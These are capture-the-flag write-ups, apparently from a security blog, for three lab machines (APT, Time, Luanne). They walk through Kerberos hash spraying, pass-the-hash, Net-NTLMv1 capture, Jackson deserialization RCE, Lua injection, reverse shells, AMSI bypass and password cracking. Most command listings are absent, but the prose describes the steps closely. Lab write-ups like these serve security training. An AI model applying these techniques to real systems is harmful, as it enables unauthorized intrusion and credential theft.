Getting kerbrute to connect to an IPv6 was a bit tricky. Just putting the address in as the DC didn’t work. Eventually I got it working using the hosts file to define the IPv6 as apt.htb. My hosts file will show both apt.htb and htb.local as this IPv6:
Then kerbrute worked:
It took a while, and found that almost none of the users from the AD backup are in the current domain on APT. There’s really only one user, so that seems like a good place to look.
Given that henry.vinson has an account in both AD environments, perhaps I can auth as that account using the hash from the backup. Unfortunately, the hash doesn’t work:
The creds are no good.
This step is supposed to be an attack on password reuse, so I’ll take all the hashes from the AD dump and try them with the one user I have, henry.vinson.
I’ll isolate the hashes into a file.
I first tried this over SMB with crackmapexec:
After about 60 hashes, the box stops responding entirely. It turns out it has wail2ban installed, preventing this kind of bruteforce. I had to reset the box to get it back.
kerbrute doesn’t work with hashes (it relies on Go libraries that don’t expose the hash as a valid credential). I could update it to take a list of hashes, but that would be a ton of work. On the other hand, pyKerbrute is really close to what I want to do. It will take a list of users and a single hash and check them all over Kerberos. I’ll use that as a shell, and just re-write the main script.
Looking at the main function for this script, it uses the command line args to fill in variables, and then calls:
In this case, line is looping over the usernames. Looking where passwordspray_tcp is defined, I can get the variable names to get a better idea of the arguments:
I’ll write my own main that loops over hashes, calling passwordspray_tcp with the same username and different hashes, and let that function handle the check and printing of success. My main bit looks like:
I’ll need to run this out of the same directory as it locally imports some crypto stuff, and I’ll use legacy Python, as those libraries choke otherwise. It finds a hash that works:
henry.vinson doesn’t have permissions to do WinRM and isn’t admin (so no psexec). Still, there are things that you can do with credentials for an unprivileged user. If I had a plaintext password, I could open a cmd windows using runas and the /netonly flag. This stores the given credentials in my local system memory as if I’m that remote user, and when I try to run something interacting with the remote domain, the credentials are validated at that DC. This terminal could be used to run commands that run on remote computers.
Windows doesn’t provide an interface to do that authentication with a hash, but Mimikatz does. In my Windows VM, I’ll run mimikatz.exe as administrator. I’ll need to enable debug privileges:
Now I can use the sekurlsa::pth command to start a CMD window with the creds for htb.local/henry.vinson:
This pops a new cmd.exe windows on my VM that has creds for henry.vinson cached.
There wasn’t a ton I could do as henry.vinson, but I was able to remote access the registry, but only the HKCU hive:
In the output above I went for a key I know well from malware persistence, and there was nothing there, but it shows that I can access HKCU. That works because henry.vinson is currently logged onto APT, as shown by Get-NetSession from PowerView:
Looking around HKCU, there’s an interesting bit of software that jumped out, GiganticHostingManagementSystem:
This key has two values, which look to be creds for henry.vinson_adm:
Impacket has a script, reg.py, which will do remote reg reads and can take a hash as auth. It took a minute to get the syntax right, and looking at the help to notice that the Current User hive is referred to as HKU and not HKCU, but it works:
The “_adm” in the username suggests this account will have admin level access of some kind, and it does at least have permissions to WinRM. I’ll get a shell with Evil-WinRM:
And grab user.txt:

Category: Shell as Administrator
There’s not much on the host I can see as henry.vinson_adm. The only users on the box are the two henry.vinson accounts and the administrator account.
There is a PowerShell history file in the henry.vinson_adm account’s directory:
These commands are a hint. Interestingly, the timestamp on this file is 11 days after release, so this perhaps was a hint added after such a long initial blood time. The hint is to look at lmcompatibilitylevel. According to the docs, level of 2 means:
Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication.
NTLMv1 is insecure, and can be abused. I’ll verify it is set that way on APT:
If I’d missed the history file, I tried to find it with WinPeas. I uploaded the WinPEAS exe and tried to run it, but Defender ate it:
I was able to bypass this using some builtin features of Evil-WinRM. First, I’ll run menu and then Bypass-4MSI to disable AMSI:
Now I can use Invoke-Binary to load an EXE from my system into memory:
This method of running does seem to cache all the output and then dump it once the process is complete, so it can take some patience to wait for output to come. WinPEAS didn’t identify the NTLM insecurity.
Seatbelt is another enumeration script writing in C#. It has the same issues with AMSI/Defender as WinPEAS, and can be bypassed the same way.
The goal here is to capture a Net-NTLMv1 hash that I can send to crack.sh. Net-NTLM is a challenge response protocol, where the client (APT) reached out to the server and says “I’m ABC”, the server (in this case Responder) says “If you are ABC, prove it on this random 8-bytes”. The client does a computation using it’s NTLM hash (derived from the password), and sends it back. Assuming the legit server has access to that hash, it can verify that client did too.
Net-NTLMv1 responses (often referred to as hashes, but not really a hash) use weak crypto. crack.sh has a service for cracking them using rainbow tables. Rainbow tables are just precomputed tables of tons of possible inputs mapped the the results. For example, someone can spend months calculating a given hash of all possible inputs, and then forever use these tables to map hashes back to inputs.
Typically a way to defeat rainbow tables is to have unique salts per hash. This makes all the passwords significantly more random, and reduces the effectiveness of rainbow tables. Something like a Net-NTLM won’t work with rainbow tables if you passively capture the exchange, because there’s a unique challenge generated by the server for each connection. What crack.sh has done is create rainbow tables for the specific challenge of “1122334455667788”. In a case like this, where the server is under malicious control, it can set that challenge to always be that specific value that was used for the rainbow table generation. This is all described on the crack.sh page.
I’ll need a method to get the System account to reach out to my server so that I can capture that hash. I’ll show two.
This Technet page gives details on how to initiate a Defender scan of a specific file. MpCmdRun is in %ProgramFiles\Windows Defender. I’ll use these options:
Before I start Responder, I’ll edit /etc/responder/Responder.conf to set the challenge to 1122334455667788, the pattern that crack.sh has used in its rainbow tables. I’ll start responder, giving it the --lm flag to try to force a downgrade to Net-NTLMv1:
With Responder waiting, I’ll initiate the Defender scan:
At Responder, there’s a challenge response:
This is the author’s intended solution. I’ll do my best to explain it here, but it’s not something I could have come up with on my own.
RoguePotato won’t work to get execution as System because henry.vinson_adm doesn’t have SeImpersonatePrivilege. Still, it will generate the RPC call and Net-NTLM auth as SYSTEM, which is what I’m trying to capture here. With the Impacket tools, RPC is a bit hard to work with and unstable, so it’s easier to accept the RPC connection, and use SMB to do the NTLM authentication. The challenge there is that SMB is not listening on IPv4, so I’ll need to update RoguePotato to work with an IPv6 address.
I’ll clone the RoguePotato Git repo into my Windows VM and open the project in Visual Studio. I’ll build the solution to make sure it builds before I edit it, and it does.
In RoguePotato.cpp, there’s a global variable, remote_ip:
It is set here based on the command line arguments. Searching in the “Solutions Explorer”, it’s used in another file, IStorageTrigger.cpp:
It’s converted here from a wide-character string to a multibyte string (wcstombs):
It will only read the first 16 bytes as is, which is enough to hold an IPv4 address as string (four groups of one to three digits + three periods and a newline or null). An IPv6 address is 16 bytes, but when represented as a string, will be eight groups of four characters plus : between each group, so up to 40 bytes. I’ll update those two lines:
Luckily for me, the rest of the code is built off the length of this, so it should work with no additional changes. I’ll build the solution and copy the new binary back to my Parrot VM.
Note: IppSec mentioned he had some issue with RoguePotato being eaten by Defender on APT. I didn’t have to do any evasion, yet he did the same thing and did. It must come down to Visual Studio version, compiler settings, or other odd things like that. If you happen to have issues, his video would be a good place to watch for how he gets around it.
Now that RoguePotato will initiate an RPC connection back to me, I want an RPC server that will send the specific challenge 1122334455667788 that will work with the rainbow tables at Crack.sh.
The idea is to start with ntmlrelayx.py, a script in the Impacket examples that is used to perform relay attacks. By default it has SMB, HTTP, and recently added WCF / ADWS servers. The idea is that the attacker gets the victim somehow to connect to one of these servers, and then use that to gain authentication (over one of many potential protocols that authenticate with Net-NTLM) at a different server as the victim. This post does a good job explaining that in further detail, and has this really nice diagram:
This patch will update an older Impact version to add an RPC server in ntlmrelayx.py. That server still wants to reach out to a target (step 2 above) and get a challenge (3) to send back to the victim for verification. I’ll want to modify it to not have a target, but just send the same challenge back (1122334455667788). In reality, this could all be done over RPC, but doing so with Impacket was unstable, so the code will switch to SMB to do the NTLM negotiation.
Even with people telling me the path and giving me code samples, this took a ton of debugging trial and error to get working. IppSec and I spent several hours on a call adding print statements and pdb breaks to try to get this working. I don’t have a good way to recreate all that troubleshooting in a blog post. But, if you’re working with Python code, the line import pdb;pdb.set_trace() is really a friend!
If I try to apply the patch to the most recent Impacket release, it will fail. The gist with the patch was released seven months ago, so the latest release at the point was 0.9.21. This patch is actually expecting to be run against Impact commit 3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8, which is a few commits after that release (it took some trial and error to find that commit that accepted the patch). I’ll clone the repo, check out that commit:
I’ll download and apply the patch:
It’s important that all the patches are applied cleanly. If there are any rejections, something went wrong.
Next, I’ll update impacket/examples/ntlmrelayx/servers/rpcrelayserver.py . This file was added by the patch, and handles the  RPC server. In the setup function of the RPCHandler class, it currently manages grabbing a target for the relay from a list of targets. I don’t need this, so I’ll modify that to not bother with it, but rather setting the target to SMB on the client address:
The do_ntlm_negotiate function currently managed the challenge response between the incoming client and the relay target. I’ll replace all of that with code that will use the known challenge. I’ll also disable ESS (Extended Session Security).
For some reason, I found that self.target was being unset to None between setup and this call, so I reset it at the top.
For that code to work, I’ll need to import smbrelayclient at the top of the file:
Next, the negotiate_ntlm_session function handles the negotiation. It starts with a bit if / elif statement based on the messageType coming in. The NTLMSSP_AUTH_CHALLENGE_RESPONSE message contains the challenge I want to capture to try to crack. In the relay scenario, it will take this hash and forward it on to try to get auth. I’ll replace all of that with two lines to print the result.
Running like this will cause a crash in the smbrelayclient because it is not ready to handle IPv6 addresses. In impacket/examples/ntlmrelayx/clients/__init__.py, with pdb I was able to debug this code:
target.hostname was dead, which is the first quad of the IPv6 address. It seems it’s splitting the hostname on :, expecting the format host:port. target.netloc will give the full uri for the target ('dead:beef::b885:d62a:d679:573f:445'), so I can use that to do the initialization required in this function. I’ll check for more than 2 colons on the netloc, which will be in IPv6 but not IPv4.
I’ll need a main file to create and manage the server:
I’ll run create a virtual env to run all this in and install the needed packages:
I’ll run the server:
From APT, I’ll upload my modified RoguePotato binary and run it. It hangs for a minute, and prints failure. That’s ok, because I wasn’t expecting RoguePotato to work. Back at the RPC server:
In the middle is the Net-NTLMv1 hash:
Either of the above methods produce a Net-NTLMv1 hash, which I can now take to the crack.sh submission page, and put it in (it qualifies for free):
The hash came back minutes later:
Now I have the NTLM hash for the machine account of this domain controller. That can be used with secretsdump.py to dump the hashes for the rest of the AD:
The administrator hash is enough to get a shell:
And get the root flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 24 Oct 2020
OS : Linux
Base Points : Medium [30]
Creators : egotisticalSWfelamos
Nmap scan:
Host is up (0.014s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap found two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 20.04 Focal.
The site is a JSON Beautifier and Validator:
I verified the site is running php by loading index.php, and getting the same page.
I can enter some basic JSON like {"foo": "bar", "baz": 1} and it will beautify:
Giving the same data in Validate returns an error:
The full error is:
So the backend is using Java to validate the JSON, specifically this package, Jackson.

Category: Shell as pericles
There were a bunch of CVEs for Jackson. In fact, the hardest part of this box was finding the right one that worked here. Eventually I found this post which contained this payload as a test:
This is taking advantage of a JSON deserialization vulnerability. In this proof of concept, they are using the H2 database driver (which should be present in most Java deployments that use a database, which is most). This driver can take an SQL script to run, which is typically used benignly to support database migrations.
I’ll update the URL to point to my VM:
On submitting to Time, I get a request at my local HTTP server:
It worked!
There’s a sample SQL script used to weaponize this in the post as well:
The init script can’t run Java, only SQL statements. However, that can be worked around, as within SQL, it is allowed to define an alias containing Java code. In the example about, it defines SHELLEXEC using Java code to execute a command,  and then in the last line calls it with a payload to write the output of id to a file.
Since I can’t read a file from Time (well, maybe, but really no - see Beyond Root), I’ll try a ping:
I’ll update the URL in the JSON, and submit:
A second later, at tcpdump:
It worked. I’ve got RCE.
I’ll create a copy of the script, rev.sql, and add a reverse shell:
On submitting, the script is loaded from the webserver, and then the reverse shell comes to nc:
I’ll upgrade my shell with the normal trick:
And grab user.txt:

Category: Shell as root
After my normal checks didn’t surface much, I started an HTTP server in my local LinPEAS directory, uploaded it to Time, and ran it:
One line that jumped out was in the System Timers section:
This timer was last run four seconds ago and was going to run again in five seconds. On HTB machines, any timer less than five minutes is worth looking at.
The service will be defined in a file in /etc/systemd:
That file is relatively simple:
The Wants and WantedBy describes the relation of this service to others as far as starting. ExecStart describes what it runs. In this case, it’s just restarting another service, web_backup.service. That config:
It’s running /usr/bin/timer_backup.sh, a shell script, which is writable:
I’ll add a reverse shell to the end of the script:
Very quickly, I’ve got a root shell at nc:
However, the shell dies after like 10 seconds. That’s plenty to get the flag:
I’ll look at getting a better shell in Beyond Root.
When testing RCE for the initial foothold, I went with a ping. I was already confident that it was starting to work, since the SQL script was being requested from my supplied URL, and that seemed like a solid way to test RCE and connectivity back. But as I started to write in my notes that I couldn’t write a file and see it, I wondered - is that true? There’s a webserver after all. Perhaps I could write a webshell (not really sure why I need once since I already have RCE and a reverse shell, but what if a firewall were blocking all outbound?).
I tried the payload from the site (id > exploited.txt), but nothing showed up at the web root or any folders I knew about. I cheated a bit, since I had a shell already, and checked.
It returned nothing. I modified the payload slightly to id > /tmp/exploited.txt. On re-run, that worked:
So why couldn’t I write to the web root? Well, permissions:
There are no folders in html that are writable by the pericles user (which is where the RCE happens).
The shell that came back dies in about 10 seconds, which is enough time to grab root.txt. But of course I wanted a stable shell. The easy way to do this is just to have script write my SSH public key into authorized_keys:
This will create the directory /root/.ssh if it doesn’t exist, and then write my tiny ed25519 public key into the authorized_keys file.
Still, cases come up where a short lived shell is all you can get. It’s interesting to see how to script commands to run on the shell. I’ll just echo them into the nc listener:
It connects, and then I’ll Ctrl-C to exit and then connect over SSH, and it works:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 28 Nov 2020
OS : Other
Base Points : Easy [20]
Nmap scan:
Host is up (0.023s latency).
Not shown: 58365 filtered ports, 7167 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9001/tcp open  tor-orportCategory: Recon
nmap found three open TCP ports, SSH (22), HTTP (80), and Medisa httpd / Supervisor process manager (9001):
nmap identifies the box as running NetBSD, another BSD variant.
TCP 80 has a robots.txt file with /weather disallowed.
Visiting the page returns a 401 and a prompt for auth:
There’s a hint there, “default”.
Googling for “supervisord default password” returns a top hit to the docs for the project on the configuration file. There isn’t a default password, but there is an example config file:
Sure enough, entering user / 123 lets me into the site:
The dashboard shows three running scripts, and clicking on the name of any of them leads to the output. I didn’t get anything interesting from memory or uptime. process returns:
There’s a long grep which is likely selecting which lines of the full process list are displayed here. The only command line string that really gives much information is the one for httpd:
Using the man page for httpd on NetBSD (or bozohttpd), the args are:
It’s interesting that the Lua script is handling the path disallowed in the robots.txt file.
Trying to visit the site pops an auth prompt:
It’s not part of the box, but it is interesting to know what is really happening here. Looking in Burp, I’ll see this is really a GET request from my browser for /, with a 401 response from the server. Firefox sees that 401 and prompts for creds. If I add some and submit, it will send the same GET request again, this time with an extra header:
The base64 string is just the encoded creds I entered:
More interestingly, there’s some information in the response:
As nmap identified, the server is nginx.
The WWW-Authenticate: Basic realm="." header is saying that the type of auth required is HTTP basic, the description of the auth is just ., which doesn’t tell me much.
There’s also a reference to 127.0.0.1:3000 as the source of this response. That suggests that NGINX is proxying the requests on 80 to httpd to handle them on localhost port 3000, as noted above in the process list.
I’ll run feroxbuster (GitHub) against the site, but it doesn’t find anything:
I’m trying the default wordlist for feroxbuster from SecLists, but I also tried my old standby directory-list-2.3-medium and found nothing as well.
There is a custom Lua script running on requests to /weather/. Just visiting that path returns a 404. But running feroxbuster again finds something:
Visiting http://10.10.10.218/weather/forecast returns a raw JSON payload with a message that a city is required, and a hint on how to list them:
I can switch to curl and jq at this point:
I typically use -s on curl by habit so when I start piping it to things, I don’t see the status message.
Adding ?city=list to the end of the url provides a list of cities in the UK:
Picking a city from the list, it returns a bunch of (inaccurate) information about the weather there:
The city names are case-sensitive, and any input that isn’t an exact match leads to a 500 error:

Category: Shell as _http
The requests at /weather/forecast are being passed to a Lua script, and the results come back as JSON which, in the case of anything not in the cities list, includes the submitted input. Googling for “Lua Injection”, the first link returned was titled Lua Web Application Secutiyy Vulnerabilities. This article shows many different kinds of attacks, most of which are more complicated than I’ll need here. But what I found most useful were the examples of vulnerable scripts. The output sent back is typically written out with something like r:puts(output) or ngx.say(output) or cgilua.put(output). If there’s no escaping done, perhaps I can inject commands.
Sending just a double quote returns the error message as if the city was ":
However, sending just a single quote crashes the script:
If I add a closing parens and then a comment, it will actually send back the payload cut off in the middle:
This suggests that the string is being built in that command, and the comment took out the part that handles the closing " and }.
To run a command from Lua, GTFObins shows it’s just os.execute("[command]"). Adding that works:
To do a more complex payload, I’ll switch to letting curl encode my arg for me:
-G will force a GET commands, and use the data from --data-urlencode in the url instead of in the body.
Because the box is BSD, some typical Linux reverse shells won’t work. I’ll start small. Can nc connect back to me?
At my listener there’s a connection:
This isn’t a shell, but I know that the box has netcat and can connect to me. I could try -e /bin/bash, but it doesn’t work. Running nc -h 2>&1 shows the -e option isn’t there. My goto Bash shell actually does give a connection back, but then immediately dies:
I tried a Lua shell, but the modules needed weren’t there:
The FIFO shell did work:
And it connects to a listening nc:

Category: Shell as r.michaels
In the web root there are three files:
index.html has a page I wasn’t able to access without auth:
robots.txt is the same as noted in the nmap. .htpasswd is interesting. This is the file that defines the basic auth requirement:
Starting with $1$ suggests this is a simple md5crypt hash (can verify in the Hashcat list of example hashes). Hashcat breaks it instantly with hashcat -m 500 htpasswd --user /usr/share/wordlists/rockyou.txt to iamthebest.
Using those creds, I can now load http://10.10.10.218:
This doesn’t really give anything new other than links back to the API I already exploited.
I did take a look at the Lua script, which is interesting, but not necessary for privesc (check out Beyond Root).
There’s only one user on the box, r.michaels:
_http can’t access this directory. But it seems like this user is a good next target.
There’s a single process in the process list that’s running as r.michaels:
It looks very similar to the httpd process above, but this one is running a different weather.lua script, listening on TCP 3001 (instead of 3000), and serving out of /home/r.michaels/devel/www.
Is this vulnerable to the same exploit? I can access it from this shell:
It looks like this version is not vulnerable to the command injection as before:
I looked through the Lua script for places where there might have been a more difficult to guess vulnerability, but didn’t see anything (at least not with my limited Lua experience).
I remember thinking it was a bit weird to see -u in the httpd command line. This makes the public folders in a users homedirectory web accessible. I didn’t have a username when I started poking at this service, but I do now.
Trying to access /~r.michaels/ returns 401:
I can add in the creds from the .htpasswd file and they work:
Directory listing is enabled (-X in the command line), and this shows a single file, id_rsa. One more curl returns the private key:
A note - This is not reading the private key from the users ~/.ssh directory. For some reason, the user must have put their private key intentionally in their ~/public_html directory. Perhaps they figured since it’s only on localhost it was less at risk there. Then again, it’s not clear what use it provides the user there either.
With a copy of this key, I can get a shell as r.michaels:
And grab user.txt:

Category: Shell as root
sudo -l is the first thing I check on Linux hosts. The equivalent on BSD is doas. The configuration file is a bit buried:
But it says that this user can run anything as root:
Unfortunately, it requires a password:
In the current homedir, there are three folders:
devel has the code for the new version of the API. public_html just has the SSH key. backups is interesting, holding what looks like an encrypted Tar archive:
Looking around the box for any hint about what could be used to decrypt this data, I noticed a .gnupg  directory in r.michael’s home directory, and it contains keyrings:
netpgp is installed on the box, and it decrypts the file:
The file decompresses to contain familiar files at this point:
weather.lua is exactly the same as the public version. index.html is also similar. The .htpasswd file is different:
It breaks the same way (hashcat -m 500 htpasswd2 --user /usr/share/wordlists/rockyou.txt), this time to the password littlebear.
Now with a potential password, I can try to doas as root, and it works:
And I can grab the root flag:
I pretty much a noob at Lua, so of course I knew I wanted to understand how this script worked, and how I could inject into it, comparing the vulnerable version to the patched.
The general structure of the program looks like:
It loads some modules, defines some constants and two functions, and then calls register_handler. This is actually mentioned on the httpd man page:
So this is how /weather/forecast gets to the script, and then it is passed to the function forecast.
The valid_city function just checks if a string is in the list. The forecast function is where the injection is.
It starts by checking for the city parameter, and if it’s not there, it writes the message I first got on visiting the API:
Back inside that snip above, it checks if city=list, and if so, generates the list of cities as a JSON string, writing it with http.write:
If city is not list and it’s not a valid city, then it jumps into the error message creation:
If it is a valid city, there’s a bunch of code generating random weather JSON.
The vulnerability is in how the error message JSON is created. First, a string, json is created using the string.format function:
So if I pass in city=0xdf, then json will be:
With this string built, it will pass that into load:
That is the dangerous part. load effectively loads the string into memory as Lua commands, and then the () runs that. It’s kind of like calling eval on a string in Python (also dangerous).
In the dev version of this script, the error message generation is much cleaner:
This time it’s just appending the city into the string, and then passing that to http.write.
CTF solutions, malware analysis, home lab development
